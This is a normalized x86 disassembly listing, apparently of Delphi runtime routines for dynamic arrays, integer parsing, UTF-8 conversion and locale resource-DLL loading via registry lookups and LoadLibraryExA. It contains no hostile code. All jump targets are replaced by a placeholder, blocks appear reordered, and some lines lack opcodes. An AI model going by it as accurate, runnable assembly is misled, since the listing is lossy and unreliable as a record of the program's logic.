mov ebp esp
push ebx
push esi
push edi
mov edi ecx
mov ebx edx
mov esi eax
mov eax esi
call sub_4048b0
cmp ebx 0x1
jge r-xdata
dec ebx
cmp eax ebx
jge r-xdata
xor ebx ebx
jmp r-xdata
test edi edi
jge r-xdata
mov ebx eax
sub eax ebx
cmp edi eax
jge r-xdata
xor eax eax
jmp r-xdata
mov edx ebx
add edx edx
add edx esi
mov ecx [ ebp + 0x8 ]
xchg ecx eax
call sub_404830
pop edi
pop esi
pop ebx
pop ebp
retn 0x4
mov eax edi
sub_40498c
push ebx
push esi
push edi
mov esi edx
mov edi eax
xor ebx ebx
test esi esi
jle r-xdata
mov eax edi
mov edx ebx
call sub_404734
pop edi
pop esi
pop ebx
retn
mov eax esi
call sub_40471c
mov ebx eax
mov eax [ edi ]
call sub_4048b0
test eax eax
jle r-xdata
cmp esi eax
jge r-xdata
mov ecx eax
add ecx ecx
mov edx ebx
mov eax [ edi ]
call sub_4028c8
mov eax esi
sub_4049d0
xor ecx ecx
push ebx
mov cl [ edx + 0x1 ]
push esi
push edi
mov ebx eax
lea esi [ ecx + edx + 0xa ]
mov edi [ ecx + edx + 0x6 ]
mov edx [ esi ]
mov eax [ esi + 0x4 ]
add eax ebx
mov edx [ edx ]
mov ecx 0x1
call sub_404a00
add esi 0x8
dec edi
jg r-xdata
pop edi
pop esi
pop ebx
retn
sub_404a00
test ecx ecx
je r-xdata
retn
push ebx
push esi
push edi
mov ebx eax
mov esi edx
mov edi ecx
xor edx edx
mov al [ esi ]
mov dl [ esi + 0x1 ]
xor ecx ecx
cmp al 0xa
je r-xdata
mov [ ebx ] ecx
add ebx 0x4
dec edi
jg r-xdata
cmp al 0xb
je r-xdata
jmp r-xdata
cmp al 0xc
je r-xdata
pop edi
pop esi
pop ebx
mov [ ebx ] ecx
mov [ ebx + 0x4 ] ecx
mov [ ebx + 0x8 ] ecx
mov [ ebx + 0xc ] ecx
add ebx 0x10
dec edi
jg r-xdata
cmp al 0xd
je r-xdata
jmp r-xdata
push ebp
mov ebp edx
cmp al 0xe
je r-xdata
mov edx [ esi + ebp + 0xa ]
mov eax ebx
add ebx [ esi + ebp + 0x2 ]
mov ecx [ esi + ebp + 0x6 ]
mov edx [ edx ]
call sub_404a00
dec edi
jg r-xdata
pop ebp
jmp r-xdata
push ebp
mov ebp edx
cmp al 0xf
je r-xdata
mov eax ebx
add ebx [ esi + ebp + 0x2 ]
mov edx esi
call sub_4049d0
dec edi
jg r-xdata
pop ebp
cmp al 0x11
je r-xdata
mov al 0x2
pop edi
pop esi
pop ebx
jmp sub_402828
sub_404aa0
xor ecx ecx
push ebx
mov cl [ edx + 0x1 ]
push esi
push edi
mov ebx eax
lea esi [ ecx + edx + 0xa ]
mov edi [ ecx + edx + 0x6 ]
mov edx [ esi ]
mov eax [ esi + 0x4 ]
add eax ebx
mov edx [ edx ]
mov ecx 0x1
call sub_404aec
add esi 0x8
dec edi
jg r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
retn
sub_404aec
cmp ecx 0x0
je r-xdata
retn
push eax
push ebx
push esi
push edi
mov ebx eax
mov esi edx
mov edi ecx
xor edx edx
mov al [ esi ]
mov dl [ esi + 0x1 ]
cmp al 0xa
je r-xdata
cmp ecx 0x1
mov eax ebx
jg r-xdata
cmp al 0xb
je r-xdata
mov edx ecx
call sub_40405c
jmp r-xdata
call sub_404038
jmp r-xdata
cmp ecx 0x1
mov eax ebx
jg r-xdata
cmp al 0xc
je r-xdata
pop edi
pop esi
pop ebx
pop eax
mov edx ecx
call sub_40475c
jmp r-xdata
call sub_404744
jmp r-xdata
mov eax ebx
add ebx 0x10
call sub_404ad4
dec edi
jg r-xdata
cmp al 0xd
je r-xdata
jmp r-xdata
push ebp
mov ebp edx
cmp al 0xe
je r-xdata
mov edx [ esi + ebp + 0xa ]
mov eax ebx
add ebx [ esi + ebp + 0x2 ]
mov ecx [ esi + ebp + 0x6 ]
mov edx [ edx ]
call sub_404aec
dec edi
jg r-xdata
pop ebp
jmp r-xdata
push ebp
mov ebp edx
cmp al 0xf
je r-xdata
mov eax ebx
add ebx [ esi + ebp + 0x2 ]
mov edx esi
call sub_404aa0
dec edi
jg r-xdata
pop ebp
jmp r-xdata
mov eax ebx
add ebx 0x4
call sub_405934
dec edi
jg r-xdata
cmp al 0x11
je r-xdata
jmp r-xdata
mov eax ebx
mov edx esi
add ebx 0x4
call sub_405254
dec edi
jg r-xdata
jmp r-xdata
jmp r-xdata
pop edi
pop esi
pop ebx
pop eax
mov al 0x2
jmp sub_402828
sub_404bfc
push ebx
push esi
push edi
push ebp
mov ebx eax
mov esi edx
xor eax eax
mov al [ ecx + 0x1 ]
lea edi [ eax + ecx + 0xa ]
mov ebp [ edi - 0x4 ]
xor eax eax
mov ecx [ edi - 0x8 ]
push ecx
mov eax [ edi + 0x4 ]
mov edx [ edi ]
mov edx [ edx ]
mov cl [ edx ]
cmp cl 0xa
je r-xdata
mov edx eax
add eax esi
add edx ebx
call sub_4028c8
mov edx [ eax + esi ]
add eax ebx
call sub_40408c
mov eax 0x4
jmp r-xdata
cmp cl 0xb
je r-xdata
add eax [ edi + 0x4 ]
add edi 0x8
dec ebp
jne r-xdata
mov edx [ eax + esi ]
add eax ebx
call sub_404780
mov eax 0x4
jmp r-xdata
cmp cl 0xc
je r-xdata
mov ecx [ edi + 0x4 ]
sub ecx eax
jle r-xdata
pop ecx
sub ecx eax
jle r-xdata
lea edx [ eax + esi ]
add eax ebx
call sub_404be4
mov eax 0x10
jmp r-xdata
cmp cl 0xd
je r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
lea edx [ eax + ebx ]
add eax esi
call sub_4028c8
xor ecx ecx
mov cl [ edx + 0x1 ]
push [ ecx + edx + 0x2 ]
push [ ecx + edx + 0x6 ]
mov ecx [ ecx + edx + 0xa ]
mov ecx [ ecx ]
lea edx [ eax + esi ]
add eax ebx
call sub_404d18
pop eax
jmp r-xdata
cmp cl 0xe
je r-xdata
xor ecx ecx
mov cl [ edx + 0x1 ]
mov ecx [ ecx + edx + 0x2 ]
push ecx
mov ecx edx
lea edx [ eax + esi ]
add eax ebx
call sub_404bfc
pop eax
jmp r-xdata
cmp cl 0xf
je r-xdata
mov edx [ eax + esi ]
add eax ebx
call sub_40594c
mov eax 0x4
jmp r-xdata
cmp cl 0x11
je r-xdata
mov ecx edx
mov edx [ eax + esi ]
add eax ebx
call sub_405290
mov eax 0x4
mov al 0x2
pop ebp
pop edi
pop esi
pop ebx
jmp sub_402828
sub_404d18
push ebx
push esi
push edi
push ebp
mov ebx eax
mov esi edx
mov edi ecx
mov ebp [ esp + 0x14 ]
mov cl [ edi ]
cmp cl 0xa
je r-xdata
mov eax ebx
mov edx [ esi ]
call sub_40408c
add ebx 0x4
add esi 0x4
dec ebp
jne r-xdata
cmp cl 0xb
je r-xdata
jmp r-xdata
mov eax ebx
mov edx [ esi ]
call sub_404780
add ebx 0x4
add esi 0x4
dec ebp
jne r-xdata
cmp cl 0xc
je r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn 0x4
jmp r-xdata
mov eax ebx
mov edx esi
call sub_404be4
add ebx 0x10
add esi 0x10
dec ebp
jne r-xdata
cmp cl 0xd
je r-xdata
jmp r-xdata
xor ecx ecx
mov cl [ edi + 0x1 ]
lea edi [ ecx + edi + 0x2 ]
cmp cl 0xe
je r-xdata
mov eax ebx
mov edx esi
mov ecx [ edi + 0x8 ]
push [ edi + 0x4 ]
call sub_404d18
add ebx [ edi ]
add esi [ edi ]
dec ebp
jne r-xdata
jmp r-xdata
mov eax ebx
mov edx esi
mov ecx edi
call sub_404bfc
xor eax eax
mov al [ edi + 0x1 ]
add ebx [ eax + edi + 0x2 ]
add esi [ eax + edi + 0x2 ]
dec ebp
jne r-xdata
cmp cl 0xf
je r-xdata
jmp r-xdata
mov eax ebx
mov edx [ esi ]
call sub_40594c
add ebx 0x4
add esi 0x4
dec ebp
jne r-xdata
cmp cl 0x11
je r-xdata
jmp r-xdata
mov eax ebx
mov edx [ esi ]
mov ecx edi
call sub_405290
add ebx 0x4
add esi 0x4
dec ebp
jne r-xdata
mov al 0x2
pop ebp
pop edi
pop esi
pop ebx
jmp sub_402828
sub_404e38
push edx
push eax
mov eax [ esp + 0x10 ]
mul [ esp ]
mov ecx eax
mov eax [ esp + 0x4 ]
mul [ esp + 0xc ]
add ecx eax
mov eax [ esp ]
mul [ esp + 0xc ]
add edx ecx
pop ecx
pop ecx
retn 0x8
sub_404e5c
push ebx
push esi
push edi
push ebp
add esp 0xffffffec
mov [ esp ] edx
mov esi eax
mov ebp 0x1
xor edi edi
mov [ esp + 0x8 ] 0x0
mov [ esp + 0xc ] 0x0
test esi esi
jne r-xdata
cmp [ esi + ebp - 0x1 ] 0x20
je r-xdata
mov eax [ esp ]
mov [ eax ] ebp
jmp r-xdata
inc ebp
mov [ esp + 0x10 ] 0x0
mov al [ esi + ebp - 0x1 ]
cmp al 0x2d
jne r-xdata
mov eax [ esp + 0x8 ]
mov edx [ esp + 0xc ]
add esp 0x14
pop ebp
pop edi
pop esi
pop ebx
retn
cmp al 0x2b
jne r-xdata
mov [ esp + 0x10 ] 0x1
inc ebp
jmp r-xdata
mov bl 0x1
cmp [ esi + ebp - 0x1 ] 0x24
je r-xdata
inc ebp
cmp [ esi + ebp - 0x1 ] 0x30
jne r-xdata
mov al [ esi + ebp - 0x1 ]
call sub_402a54
cmp al 0x58
je r-xdata
inc ebp
inc ebp
cmp [ esi + ebp - 0x1 ] 0x30
jne r-xdata
mov edi eax
and edi 0xff
sub edi 0x30
jmp r-xdata
add dl 0xf9
sub dl 0x6
jb r-xdata
mov al [ esi + ebp - 0x1 ]
mov edx eax
add dl 0xd0
sub dl 0xa
jae r-xdata
mov al [ esi + ebp ]
call sub_402a54
cmp al 0x58
jne r-xdata
cmp [ esp + 0xc ] 0x0
jne r-xdata
mov edi eax
and edi 0xff
sub edi 0x37
jmp r-xdata
add dl 0xe6
sub dl 0x6
jb r-xdata
cmp [ esp + 0x10 ] 0x0
je r-xdata
mov edi eax
and edi 0xff
sub edi 0x30
cmp [ esp + 0xc ] 0x0
jne r-xdata
jl r-xdata
cmp [ esp + 0x8 ] 0x0
jb r-xdata
mov edi eax
and edi 0xff
sub edi 0x57
jmp r-xdata
cmp [ esp + 0xc ] 0x0
jne r-xdata
mov eax [ esp + 0x8 ]
mov edx [ esp + 0xc ]
neg eax
adc edx 0x0
neg edx
mov [ esp + 0x8 ] eax
mov [ esp + 0xc ] edx
jl r-xdata
cmp [ esp + 0x8 ] 0x0
jb r-xdata
cmp [ esp + 0x10 ] 0x0
je r-xdata
cmp [ esp + 0xc ] 0xfffffff
jne r-xdata
jmp r-xdata
je r-xdata
cmp [ esp + 0x8 ] 0x0
cmp [ esp + 0xc ] 0xccccccc
jne r-xdata
jmp r-xdata
cmp [ esi + ebp - 0x1 ] 0x0
setne al
or bl al
je r-xdata
mov eax [ esp + 0x8 ]
mov edx [ esp + 0xc ]
neg eax
adc edx 0x0
neg edx
mov [ esp + 0x8 ] eax
mov [ esp + 0xc ] edx
jmp r-xdata
jg r-xdata
cmp [ esp + 0x8 ] 0xffffffff
jbe r-xdata
cmp [ esp + 0xc ] 0x0
jne r-xdata
jg r-xdata
cmp [ esp + 0x8 ] 0xcccccccc
jbe r-xdata
mov eax [ esp ]
xor edx edx
mov [ eax ] edx
mov eax [ esp ]
mov [ eax ] ebp
jmp r-xdata
mov eax edi
cdq
push edx
push eax
mov eax [ esp + 0x10 ]
mov edx [ esp + 0x14 ]
shld edx eax 0x4
shl eax 0x4
add eax [ esp ]
adc edx [ esp + 0x4 ]
add esp 0x8
mov [ esp + 0x8 ] eax
mov [ esp + 0xc ] edx
inc ebp
xor ebx ebx
jmp r-xdata
jmp r-xdata
setl al
cmp [ esp + 0x8 ] 0x0
setb al
jmp r-xdata
push 0x0
push 0xa
mov eax [ esp + 0x10 ]
mov edx [ esp + 0x14 ]
call sub_404e38
push edx
push eax
mov eax edi
cdq
add eax [ esp ]
adc edx [ esp + 0x4 ]
add esp 0x8
mov [ esp + 0x8 ] eax
mov [ esp + 0xc ] edx
inc ebp
xor ebx ebx
jmp r-xdata
jmp r-xdata
mov al [ esi + ebp - 0x1 ]
mov edx eax
add dl 0xd0
sub dl 0xa
jb r-xdata
dec ebp
cmp al [ esp + 0x10 ]
je r-xdata
sub_4050bc
push ebp
mov ebp esp
add esp 0xffffffe0
push ebx
push esi
push edi
mov [ ebp - 0x8 ] ecx
mov esi edx
mov [ ebp - 0x4 ] eax
mov ebx [ ebp - 0x4 ]
mov ebx [ ebx ]
mov eax [ ebp + 0x8 ]
mov edi [ eax ]
test edi edi
jg r-xdata
xor eax eax
mov [ ebp - 0x10 ] eax
test ebx ebx
je r-xdata
test edi edi
jge r-xdata
xor eax eax
mov al [ esi + 0x1 ]
add esi eax
mov eax esi
mov edx [ eax + 0x2 ]
mov [ ebp - 0x18 ] edx
mov edx [ eax + 0x6 ]
test edx edx
je r-xdata
sub ebx 0x4
mov eax [ ebx ]
mov [ ebp - 0x10 ] eax
sub ebx 0x4
mov eax [ ebp - 0x4 ]
mov edx esi
call sub_4050b4
jmp r-xdata
mov al 0x4
call sub_402828
xor esi esi
mov esi [ edx ]
jmp r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
add [ ebp - 0x1c ] 0x8
test ebx ebx
je r-xdata
mov al 0x4
call sub_402828
mov eax edi
imul [ ebp - 0x18 ]
mov [ ebp - 0x1c ] eax
mov eax [ ebp - 0x1c ]
cdq
idiv edi
cmp eax [ ebp - 0x18 ]
je r-xdata
mov [ ebp - 0x20 ] ebx
cmp edi [ ebp - 0x10 ]
jge r-xdata
cmp [ ebx ] 0x1
jne r-xdata
lea eax [ ebp - 0x20 ]
mov edx [ ebp - 0x1c ]
call sub_40270c
mov ebx [ ebp - 0x20 ]
jmp r-xdata
test esi esi
je r-xdata
dec [ ebx ]
mov eax [ ebp - 0x1c ]
call sub_4026cc
mov ebx eax
mov eax [ ebp - 0x10 ]
mov [ ebp - 0x14 ] eax
cmp edi [ ebp - 0x14 ]
jge r-xdata
mov [ ebx ] 0x1
add ebx 0x4
mov [ ebx ] edi
add ebx 0x4
mov edx edi
sub edx [ ebp - 0x10 ]
imul edx [ ebp - 0x18 ]
mov eax [ ebp - 0x18 ]
imul eax [ ebp - 0x10 ]
add eax ebx
xor ecx ecx
call sub_402cbc
cmp [ ebp - 0x8 ] 0x1
jle r-xdata
mov eax ebx
add eax 0x8
mov edx edi
imul edx [ ebp - 0x18 ]
add eax edx
mov ecx [ ebp - 0x10 ]
sub ecx edi
mov edx esi
call j_sub_404aec
test esi esi
je r-xdata
mov [ ebp - 0x14 ] edi
mov eax [ ebp - 0x4 ]
mov [ eax ] ebx
add [ ebp + 0x8 ] 0x4
dec [ ebp - 0x8 ]
dec edi
test edi edi
jl r-xdata
mov ecx [ ebp - 0x14 ]
imul ecx [ ebp - 0x18 ]
mov edx ebx
add edx 0x8
mov eax [ ebp - 0x4 ]
mov eax [ eax ]
call sub_4028c8
mov edx [ ebp - 0x14 ]
imul edx [ ebp - 0x18 ]
mov eax ebx
add eax 0x8
xor ecx ecx
call sub_402cbc
mov eax [ ebp - 0x14 ]
push eax
mov edx [ ebp - 0x4 ]
mov edx [ edx ]
mov eax ebx
add eax 0x8
mov ecx esi
call sub_40509c
jmp r-xdata
inc edi
mov [ ebp - 0xc ] 0x0
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp - 0xc ]
lea eax [ ebx + eax * 4 ]
mov ecx [ ebp - 0x8 ]
mov edx esi
call sub_4050bc
inc [ ebp - 0xc ]
dec edi
jne r-xdata
sub_405254
mov ecx [ eax ]
test ecx ecx
je r-xdata
retn
mov [ eax ] 0x0
[ ecx - 0x8 ]
jne r-xdata
push eax
mov eax ecx
xor ecx ecx
mov cl [ edx + 0x1 ]
mov edx [ ecx + edx + 0x6 ]
test edx edx
je r-xdata
sub eax 0x8
call sub_4026ec
pop eax
mov ecx [ eax - 0x4 ]
test ecx ecx
je r-xdata
mov edx [ edx ]
call sub_404aec
sub_405290
push ebx
mov ebx [ eax ]
test edx edx
je r-xdata
test ebx ebx
je r-xdata
[ edx - 0x8 ]
mov [ eax ] edx
pop ebx
retn
[ ebx - 0x8 ]
jne r-xdata
push eax
push edx
mov edx ecx
inc [ ebx - 0x8 ]
call sub_405254
pop edx
pop eax
sub_4052b8
add esp 0xffffffe4
push 0x1c
lea edx [ esp + 0x4 ]
push edx
push eax
call sub_4012dc
cmp [ esp + 0x10 ] 0x1000
jne r-xdata
xor eax eax
mov eax [ esp + 0x4 ]
jmp r-xdata
add esp 0x1c
retn
sub_4052e8
push ebx
push esi
add esp 0xfffffef8
mov ebx eax
cmp [ ebx + 0x10 ] 0x0
jne r-xdata
mov eax [ ebx + 0x10 ]
add esp 0x108
pop esi
pop ebx
retn
push 0x105
lea eax [ esp + 0x4 ]
push eax
mov eax [ ebx + 0x4 ]
push eax
call sub_40126c
mov eax esp
mov dl 0x1
call sub_405524
mov esi eax
mov [ ebx + 0x10 ] esi
test esi esi
jne r-xdata
mov eax [ ebx + 0x4 ]
mov [ ebx + 0x10 ] eax
sub_405330
mov edx [ rw-data ]
test edx edx
je r-xdata
retn
cmp eax [ edx + 0x4 ]
je r-xdata
mov eax edx
call sub_4052e8
retn
cmp eax [ edx + 0x8 ]
je r-xdata
cmp eax [ edx + 0xc ]
jne r-xdata
mov edx [ edx ]
test edx edx
jne r-xdata
sub_40536c
push ebp
mov ebp esp
add esp 0xfffffdb0
push ebx
push esi
push edi
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov [ ebp - 0xc ] eax
push r-xdata
call sub_401274
mov esi eax
test esi esi
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax ] 0x5c
jne r-xdata
push r-xdata
push esi
call sub_40127c
mov ebx eax
test ebx ebx
je r-xdata
mov esi [ ebp - 0x4 ]
add esi 0x2
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x1 ] 0x5c
jne r-xdata
push 0x105
lea eax [ ebp - 0x24f ]
push eax
mov eax [ ebp - 0x4 ]
push eax
call ebx
test eax eax
je r-xdata
cmp [ esi ] 0x0
jne r-xdata
mov eax [ ebp - 0xc ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x4 ]
add eax 0x2
call sub_405358
mov esi eax
cmp [ esi ] 0x0
je r-xdata
mov eax [ ebp - 0x8 ]
push eax
lea eax [ ebp - 0x24f ]
push eax
mov eax [ ebp - 0x4 ]
push eax
call lstrcpynA
jmp r-xdata
lea eax [ esi + 0x1 ]
call sub_405358
mov edi eax
mov eax edi
sub eax esi
mov edx eax
add edx ebx
inc edx
cmp edx 0x105
jg r-xdata
mov eax [ ebp - 0x8 ]
push eax
lea eax [ ebp - 0x24f ]
push eax
mov eax [ ebp - 0x4 ]
push eax
call lstrcpynA
lea eax [ esi + 0x1 ]
call sub_405358
mov esi eax
cmp [ esi ] 0x0
je r-xdata
inc eax
push eax
push esi
lea eax [ ebp - 0x24f ]
add eax ebx
push eax
call lstrcpynA
lea eax [ ebp - 0x14a ]
push eax
lea eax [ ebp - 0x24f ]
push eax
call sub_40124c
mov esi eax
cmp esi 0xffffffff
je r-xdata
jmp r-xdata
push esi
call sub_401244
lea eax [ ebp - 0x11e ]
push eax
call lstrlenA
lea edx [ ebx + 0x1 ]
add eax edx
inc eax
cmp eax 0x105
jg r-xdata
mov ebx esi
sub ebx [ ebp - 0x4 ]
lea eax [ ebx + 0x1 ]
push eax
mov eax [ ebp - 0x4 ]
push eax
lea eax [ ebp - 0x24f ]
push eax
call lstrcpynA
jmp r-xdata
mov [ ebp + ebx - 0x24f ] 0x5c
mov eax 0x105
sub eax ebx
dec eax
push eax
lea eax [ ebp - 0x11e ]
push eax
lea eax [ ebp - 0x24f ]
add eax ebx
inc eax
push eax
call lstrcpynA
lea eax [ ebp - 0x11e ]
push eax
call lstrlenA
inc eax
add ebx eax
mov esi edi
sub_405524
push ebp
mov ebp esp
add esp 0xfffffee0
push ebx
push esi
mov [ ebp - 0x4 ] eax
push 0x105
lea eax [ ebp - 0x11d ]
push eax
push 0x0
call sub_40126c
mov [ ebp - 0x12 ] 0x0
lea eax [ ebp - 0x8 ]
push eax
push 0xf0019
push 0x0
push r-xdata
push 0x80000001
call sub_4012c4
test eax eax
je r-xdata
xor eax eax
push ebp
push sub_405629
push [ fs : eax ]
mov [ fs : eax ] esp
mov [ ebp - 0x18 ] 0x5
lea eax [ ebp - 0x11d ]
mov edx 0x105
call sub_40536c
lea eax [ ebp - 0x18 ]
push eax
lea eax [ ebp - 0x12 ]
push eax
push 0x0
push 0x0
lea eax [ ebp - 0x11d ]
push eax
mov eax [ ebp - 0x8 ]
push eax
call sub_4012cc
test eax eax
je r-xdata
lea eax [ ebp - 0x8 ]
push eax
push 0xf0019
push 0x0
push r-xdata
push 0x80000002
call sub_4012c4
test eax eax
je r-xdata
mov [ ebp - 0xe ] 0x0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x8 ]
push eax
call sub_4012bc
retn
lea eax [ ebp - 0x18 ]
push eax
lea eax [ ebp - 0x12 ]
push eax
push 0x0
push 0x0
push r-xdata
mov eax [ ebp - 0x8 ]
push eax
call sub_4012cc
test eax eax
je r-xdata
lea eax [ ebp - 0x8 ]
push eax
push 0xf0019
push 0x0
push r-xdata
push 0x80000001
call sub_4012c4
test eax eax
jne r-xdata
mov [ ebp - 0x12 ] 0x0
push 0x105
mov eax [ ebp - 0x4 ]
push eax
lea eax [ ebp - 0x11d ]
push eax
call lstrcpynA
push 0x5
lea eax [ ebp - 0xd ]
push eax
push 0x3
call sub_40128c
push eax
call sub_401264
xor esi esi
cmp [ ebp - 0x11d ] 0x0
je r-xdata
mov eax esi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
cmp [ ebp - 0xd ] 0x0
jne r-xdata
lea eax [ ebp - 0x11d ]
push eax
call lstrlenA
mov ebx eax
lea eax [ ebp - 0x11d ]
add ebx eax
jmp r-xdata
cmp [ ebp - 0x12 ] 0x0
je r-xdata
cmp [ ebx ] 0x2e
je r-xdata
lea eax [ ebp - 0x11d ]
cmp ebx eax
je r-xdata
lea eax [ ebp - 0x11d ]
cmp ebx eax
jne r-xdata
inc ebx
cmp [ ebp - 0x12 ] 0x0
je r-xdata
dec ebx
test esi esi
jne r-xdata
mov edx ebx
sub edx eax
mov eax 0x105
sub eax edx
push eax
lea eax [ ebp - 0x12 ]
push eax
push ebx
call lstrcpynA
push 0x2
push 0x0
lea eax [ ebp - 0x11d ]
push eax
call LoadLibraryExA
mov esi eax
cmp [ ebp - 0xd ] 0x0
je r-xdata
lea eax [ ebp - 0x11d ]
mov edx ebx
sub edx eax
mov eax 0x105
sub eax edx
push eax
lea eax [ ebp - 0xd ]
push eax
push ebx
call lstrcpynA
push 0x2
push 0x0
lea eax [ ebp - 0x11d ]
push eax
call LoadLibraryExA
mov esi eax
test esi esi
jne r-xdata
mov [ ebp - 0xb ] 0x0
lea eax [ ebp - 0x11d ]
mov edx ebx
sub edx eax
mov eax 0x105
sub eax edx
push eax
lea eax [ ebp - 0xd ]
push eax
push ebx
call lstrcpynA
push 0x2
push 0x0
lea eax [ ebp - 0x11d ]
push eax
call LoadLibraryExA
mov esi eax
sub_40579c
push ebx
push esi
push edi
mov edi edx
mov esi eax
mov ebx [ rw-data ]
test ebx ebx
je r-xdata
pop edi
pop esi
pop ebx
retn
mov eax ebx
call sub_4052e8
mov edx edi
call esi
test al al
je r-xdata
mov ebx [ ebx ]
test ebx ebx
jne r-xdata
sub_4057f8
push ebx
push esi
mov esi [ rw-data ]
test esi esi
je r-xdata
mov edx esi
test edx edx
je r-xdata
mov edx [ esi + 0x4 ]
cmp edx eax
jne r-xdata
pop esi
pop ebx
retn
mov ecx [ edx ]
test ecx ecx
je r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
mov [ rw-data ] eax
mov edx 0x8
mov eax esi
call sub_4026ec
pop esi
pop ebx
retn
mov edx [ edx ]
test edx edx
jne r-xdata
mov ebx [ ecx + 0x4 ]
cmp ebx eax
jne r-xdata
mov esi ecx
mov eax [ ecx ]
mov [ edx ] eax
mov edx 0x8
mov eax esi
call sub_4026ec
jmp r-xdata
sub_405858
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
mov eax [ rw-data ]
mov [ ebp - 0x8 ] eax
cmp [ ebp - 0x8 ] 0x0
je r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
xor eax eax
push ebp
push sub_405893
push [ fs : eax ]
mov [ fs : eax ] esp
mov ebx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call [ ebx + 0x4 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax ]
mov [ ebp - 0x8 ] eax
cmp [ ebp - 0x8 ] 0x0
jne r-xdata
sub_4058c4
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] eax
xor edx edx
push ebp
push sub_405928
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
call sub_405858
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40592f
mov eax [ ebp - 0x4 ]
cmp eax [ rw-data ]
jne r-xdata
mov eax [ rw-data ]
test eax eax
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax ]
mov [ rw-data ] eax
jmp r-xdata
retn
mov edx [ eax ]
cmp edx [ ebp - 0x4 ]
jne r-xdata
mov eax [ eax ]
test eax eax
jne r-xdata
mov edx [ ebp - 0x4 ]
mov edx [ edx ]
mov [ eax ] edx
jmp r-xdata
sub_40594c
test edx edx
je r-xdata
mov ecx [ eax ]
test ecx ecx
mov [ eax ] edx
je r-xdata
push edx
push eax
mov eax [ edx ]
push edx
call [ eax + 0x4 ]
pop eax
mov ecx [ eax ]
pop [ eax ]
test ecx ecx
jne r-xdata
retn
mov eax [ ecx ]
push ecx
call [ eax + 0x8 ]
mov eax [ ecx ]
push ecx
call [ eax + 0x8 ]
retn
retn
sub_405978
test edx edx
je sub_405934
push edi
mov edi eax
push 0x0
push esp
push ecx
push edx
mov eax [ edx ]
call [ eax ]
test eax eax
je r-xdata
mov eax [ edi ]
test eax eax
je r-xdata
mov al 0x17
jmp sub_402828
pop eax
mov [ edi ] eax
pop edi
retn
push eax
mov eax [ eax ]
call [ eax + 0x8 ]
sub_405a1c
push ebp
mov ebp esp
push ebx
push esi
mov ebx [ ebp + 0x8 ]
lea eax [ ebx + 0x4 ]
push eax
call InterlockedDecrement
mov esi eax
test esi esi
jne r-xdata
mov eax esi
pop esi
pop ebx
pop ebp
retn 0x4
mov dl 0x1
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x4 ]
sub_405a44
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] edx
xor edx edx
cmp [ ebp - 0x8 ] 0x0
je r-xdata
mov eax edx
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn 0x4
xor esi esi
xor ecx ecx
test eax eax
je r-xdata
cmp ecx [ ebp + 0x8 ]
jae r-xdata
jmp r-xdata
lea edx [ esi + 0x1 ]
mov eax [ ebp - 0x8 ]
movzx edx [ eax + ecx * 2 ]
inc ecx
cmp edx 0x7f
jbe r-xdata
cmp ecx [ ebp + 0x8 ]
jae r-xdata
inc esi
cmp ecx [ ebp + 0x8 ]
jb r-xdata
cmp edx 0x7ff
jbe r-xdata
cmp esi [ ebp - 0x4 ]
jb r-xdata
cmp esi [ ebp - 0x4 ]
jb r-xdata
inc esi
inc esi
mov [ eax + esi ] 0x0
jmp r-xdata
mov esi [ ebp - 0x4 ]
dec esi
mov edx [ ebp - 0x8 ]
movzx edx [ edx + ecx * 2 ]
inc ecx
cmp edx 0x7f
ja r-xdata
cmp edx 0x7ff
jbe r-xdata
mov [ eax + esi ] dl
inc esi
jmp r-xdata
lea ebx [ esi + 0x2 ]
cmp ebx [ ebp - 0x4 ]
ja r-xdata
lea ebx [ esi + 0x3 ]
cmp ebx [ ebp - 0x4 ]
ja r-xdata
mov ebx edx
shr ebx 0x6
or bl 0xc0
mov [ eax + esi ] bl
and dl 0x3f
or dl 0x80
mov [ eax + esi + 0x1 ] dl
add esi 0x2
mov ebx edx
shr ebx 0xc
or bl 0xe0
mov [ eax + esi ] bl
mov ebx edx
shr ebx 0x6
and bl 0x3f
or bl 0x80
mov [ eax + esi + 0x1 ] bl
and dl 0x3f
or dl 0x80
mov [ eax + esi + 0x2 ] dl
add esi 0x3
jmp r-xdata
sub_405b20
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
cmp [ ebp - 0xc ] 0x0
jne r-xdata
mov [ ebp - 0x10 ] 0xffffffff
xor eax eax
xor esi esi
cmp [ ebp - 0x4 ] 0x0
je r-xdata
xor eax eax
mov [ ebp - 0x10 ] eax
jmp r-xdata
cmp esi [ ebp + 0x8 ]
jae r-xdata
jmp r-xdata
mov eax [ ebp - 0x10 ]
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
inc eax
mov [ ebp - 0x10 ] eax
mov edx [ ebp - 0xc ]
